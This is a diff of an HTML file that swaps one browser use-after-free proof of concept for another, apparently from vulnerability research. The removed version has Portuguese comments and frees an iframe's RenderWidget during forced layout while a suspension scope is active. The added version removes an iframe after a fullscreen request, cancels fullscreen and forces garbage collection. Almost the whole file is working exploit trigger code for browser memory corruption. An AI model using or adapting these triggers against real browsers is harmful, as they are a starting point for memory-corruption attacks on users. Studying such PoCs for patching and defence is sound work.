@@ -1,96 +1,45 @@
 <!DOCTYPE html>
-<!--
-  Secondary trigger targeting WidgetHierarchyUpdatesSuspensionScope cleanup.
-  Tested path: forced layout ? scope active ? iframe removed (widget freed)
-               ? scope exits ? destrutor acessa raw ptr ? UAF
-  
-  Não atinge RenderTreeAsText::write() exatamente, mas mesma classe de bug,
-  mesmo objeto (RenderWidget), mesmo mecanismo (raw ptr após free).
--->
-<style>
-  iframe {
-    content: url();   /* Coloca RenderWidget em estado de transição */
-    zoom: 0.01;       /* Afeta como o widget é posicionado pelo layout */
-    position: absolute;
-    top: 0; left: 0;
-  }
-</style>
-<div id="log" style="font:12px monospace;white-space:pre"></div>
+<html>
+<body>
+
+<button id="start">Start</button>
 
 <script>
-const log = (msg) => {
-    document.getElementById('log').textContent += msg + '\n';
-    console.log(msg);
-};
+function gc() {
+    function gcRec(n) {
+        if (n < 1)
+            return {};
 
-// Sentinela: se chegar aqui após o trigger, não houve crash imediato
-// (pode ter havido corrupção de heap silenciosa)
-window.addEventListener('error', (e) => {
-    log('[ERROR] ' + e.message + ' @ ' + e.filename + ':' + e.lineno);
+        var temp = { i: "ab" + i + (i / 100000) };
+        temp += "foo";
+        gcRec(n - 1);
+    }
+
+    for (var i = 0; i < 10000; i++)
+        gcRec(10);
+}
+
+const iframe = document.body.appendChild(
+    document.createElement("iframe")
+);
+
+const div = iframe.contentDocument.body.appendChild(
+    document.createElement("div")
+);
+
+document.getElementById("start").addEventListener("click", () => {
+    div.webkitRequestFullscreen();
+
+    const contentDocument = iframe.contentDocument;
+
+    document.body.removeChild(iframe);
+
+    setTimeout(() => {
+        contentDocument.webkitCancelFullScreen();
+        gc();
+    }, 0);
 });
-
-onload = () => {
-    log('[+] Setup');
-
-    // Criar estado híbrido body+frameset
-    document.documentElement.append(document.createElement('frameset'));
-    log('[+] frameset appended');
-
-    const i0 = document.getElementById('i0');
-
-    // onfocus: executado durante (ou imediatamente após) layout
-    // ? remove o iframe enquanto WidgetHierarchyUpdatesSuspensionScope pode estar ativo
-    i0.onfocus = () => {
-        log('[+] onfocus fired — removing iframe');
-
-        // 1. Desfazer a ancoragem do RenderWidget do render tree
-        i0.remove();
-
-        // 2. Forçar layout síncrono imediato
-        //    ? WidgetHierarchyUpdatesSuspensionScope destrutor vai rodar
-        //    ? se raw ptr ainda está no mapa ? UAF
-        void document.body.offsetWidth;
-
-        // 3. Hash change — pode causar scrollToFragment ? re-layout
-        //    ? segunda janela para o UAF
-        location.hash = 'y';
-
-        // 4. Outro forced layout para garantir que o cleanup roda
-        void document.documentElement.offsetHeight;
-
-        log('[+] post-removal forced layouts done');
-    };
-
-    // Navegação inicial para criar estado de hash pendente
-    location.hash = 'x';
-
-    // Usar microtask assíncrona para timing correto
-    // (replicar o papel de caches.has() sem a Cache API)
-    const triggerScript = document.createElement('script');
-    const asyncFocus = window.caches
-        // Se Cache API disponível: usar como no original
-        ? `caches.has('uaf-test').then(() => { document.getElementById('i0')?.focus(); })`
-        // Fallback: microtask via Promise (comportamento similar)
-        : `Promise.resolve().then(() => { document.getElementById('i0')?.focus(); })`;
-
-    triggerScript.src = `data:text/javascript,${encodeURIComponent(asyncFocus)}`;
-    document.head.append(triggerScript);
-
-    // Forçar múltiplos ciclos de layout enquanto o focus está pendente
-    // Aumenta a janela de tempo onde o scope está ativo
-    let cycles = 0;
-    const pumpLayouts = () => {
-        if (cycles++ < 30) {
-            void document.body.offsetWidth;   // layout síncrono
-            requestAnimationFrame(pumpLayouts);
-        } else {
-            log('[+] Layout pump done. Se chegou aqui sem crash: trigger falhou ou foi patchado.');
-        }
-    };
-    requestAnimationFrame(pumpLayouts);
-
-    log('[+] Trigger chain started');
-};
 </script>
 
-<iframe id="i0" src="about:blank"></iframe>
+</body>
+</html>
